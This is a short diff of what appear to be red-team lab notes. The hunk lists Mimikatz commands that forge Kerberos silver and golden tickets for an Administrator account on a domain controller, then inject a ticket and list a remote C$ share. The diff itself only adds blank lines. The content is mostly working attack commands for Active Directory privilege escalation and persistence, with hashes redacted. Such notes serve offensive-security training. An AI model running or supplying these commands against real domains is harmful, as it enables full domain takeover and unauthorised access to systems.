@@ -26,7 +26,9 @@ ls \\ad01.insomnia.io\c$
 kerberos::golden /user:Administrator /domain:cyberbotic.io /sid:S-1-5-21-3865823697-1816233505-1834004910 /target:dc-1.cyberbotic.io /service:cifs /rc4:REDACTED /ticket:silver.kirbi
 
 kerberos::golden /user:Administrator /domain:cyberbotic.io /sid:S-1-5-21-3865823697-1816233505-1834004910 /krbtgt:REDACTED /ticket:golden.kirbi
+
 kerberos_ticket_use C:\Users\Commando\Desktop\x64\MeMe.kirbi
+
 ls \\ad01.insomnia.io\c$
 
 ```
